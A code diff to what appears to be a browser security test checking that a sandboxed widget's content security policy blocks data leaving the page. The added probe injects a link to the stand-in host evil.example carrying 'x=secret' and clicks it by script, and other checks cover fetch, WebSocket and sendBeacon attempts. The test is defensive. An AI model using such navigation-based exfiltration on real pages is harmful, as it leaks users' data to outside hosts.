@@ -127,8 +127,10 @@ const onReq = (r) => {
   attempts.push(u);
   if (!u.includes('evil.example')) return;
   r
-    .finished()
-    .then(() => finished.push(u))
+    .response()
+    .then((response) => {
+      if (response) finished.push(u);
+    })
     .catch((e) => reqFailed.push(`${u} :: ${String(e).slice(0, 70)}`));
 };
 page.on('request', onReq);
@@ -167,6 +169,19 @@ check(b && String(b.r.fetch) === 'rejected', `fetch 被 CSP 拒绝（${b?.r.fetc
 check(b && b.r.wsState !== 1, `WebSocket 未进入 OPEN（readyState=${b?.r.wsState}，1=OPEN）`);
 // sendBeacon 返回 true 只代表入队，所以只断言它没抛，不拿它当「发得出去」的证据
 check(b && b.r.beacon !== 'threw', `sendBeacon 未抛异常（返回值 ${b?.r.beacon}，是否真发出以上面的网络观测为准）`);
+
+const nav = await mount(`<a id="nav" href="https://evil.example/navigate?x=secret">跳转</a>
+<script>
+  setTimeout(function(){
+    document.getElementById('nav').click();
+    setTimeout(function(){ parent.postMessage({ probe:'report', blocked:true }, '*'); }, 300);
+  }, 0);
+</script>`);
+// Chromium currently reports the attempted sandbox navigation as a request even
+// when the CSP response is blocked, so absence of a response is the useful
+// browser-level assertion here. The accepted widget path separately rejects
+// navigation APIs and non-fragment href/src attributes before this runtime.
+check(!finished.some((u) => u.includes('/navigate')), '外部导航没有拿到响应');
 page.removeAllListeners('request');
 page.removeAllListeners('websocket');
 
